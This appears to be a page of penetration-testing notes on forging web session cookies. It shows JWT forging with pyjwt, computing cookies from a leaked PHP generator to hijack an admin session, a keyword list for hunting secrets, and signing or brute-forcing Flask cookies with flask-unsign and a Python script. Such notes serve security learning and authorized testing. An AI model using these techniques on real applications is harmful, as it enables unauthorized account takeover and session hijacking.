# Cookies Hacking

## Create a forged cookie

Sometimes we retrieve secrets or files that are responsible for creating the cookie/token to obtain an authenticated session in the web application.

For example, if we manage to get several files that are used in the backend of a web application, we must search by keywords such as:

```
SECRET_KEY,API,API_KEY,KEY,SECRET,JWT,COOKIE,PRIVATE,PUBLIC
```

### JWT

{% hint style="danger" %}
If we need to set a value to the **exp** key, it is probably referring to the **lifetime of the token**. This should generally be in the **Epoch & Unix Timestamp format** (ex: `1639086677`). You can create one at the following link: [https://www.epochconverter.com/](https://www.epochconverter.com) (be sure to create one that lasts at least 1 day).
{% endhint %}

{% tabs %}
{% tab title="With secret" %}
### jwt.io

If we have the key (SECRET\_KEY), we can modify the JWT to our liking. If we do not have it, we can try to "find it" or verify if a signature check is really being done, among other techniques.

![](../../.gitbook/assets/with\_secret\_jwt.png)

### Python

```bash
# Dependencies:
sudo pip3 install pyjwt
# Method:
import jwt
secret = "<SECRET>"
enc_jwt = jwt.encode({'user':'admin','exp':'1744967620'}, secret, algorithm='HS256')
```
{% endtab %}

{% tab title="With public/private keys" %}
### jwt.io

If we have the public key and private key used to sign the JWT, we can also forge a token.

![](../../.gitbook/assets/with\_keys\_jwt.png)
{% endtab %}
{% endtabs %}

Remember to change the algorithm:

![](../../.gitbook/assets/algorithm\_jwt.png)

### Custom (PHP)

In the following case, we managed to retrieve a file that is responsible for generating a cookie:

```php
<?php
function genSess($user){
    $max = strlen($user) - 1;
    $seed = rand(0, $max);
    $key = "custom_password123".$user[$seed]."(!528.\/9890";
    $s_cookie = $user.md5($key);

    return $s_cookie;
}
?>
```

If we obtained this file, we can compute a cookie by adding the following to the PHP code:

```php
print genSess("admin")
```

As in this case the generated cookie is dynamic, we can compute 100 cookies and see if there are repetitions:

{% hint style="danger" %}
If the cookies are repeated many times and the user has a current session in the web application, we can probably hijack the session.
{% endhint %}

```bash
for i in $(seq 1 100); do php asd.php; echo; done | sort -u
```

With the results (the cookies computed), let's test each one and see if it works.

### Flask

Default cookie session name is `session`.

Cookies in Flask use a secret just like JWT. If we know the payload structure of the cookie and we know the SECRET\_KEY, then we can create a forged cookie:

{% tabs %}
{% tab title="flask-unsign" %}
`flask-unsign` is a command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.

```bash
# Install:
pip3 install flask-unsign
# Decode Cookie:
flask-unsign -d -c '<COOKIE>'
flask-unsign --decode --cookie '<COOKIE>'
# Brute Force:
flask-unsign --unsign --cookie '<COOKIE>' --wordlist <WORDLIST>
# Signing:
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
# Signing using legacy (old versions):
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```

{% embed url="https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce" %}
{% endtab %}

{% tab title="Python" %}
```bash
# Dependencies:
sudo pip3 install waitress
```

{% code title="gen_cookie.py" %}
```python
#!/usr/bin/python3
from flask import Flask, session, request
import requests, threading, time
from waitress import serve

# Flask initiation
app = Flask(__name__)
app.config["SECRET_KEY"] = "<SECRET_KEY>"

@app.route('/')
def main():
    # Cookie format: {'auth' : 'True', 'username' : 'admin'}
    session['auth'] = 'True'
    session['username'] = "admin"
    return 'ok'

thread = threading.Thread(target = lambda: serve(app, host="127.0.0.1", port=9000))
thread.setDaemon(True)
thread.start()

time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```
{% endcode %}

```bash
python3 gen_cookie.py
```
{% endtab %}
{% endtabs %}
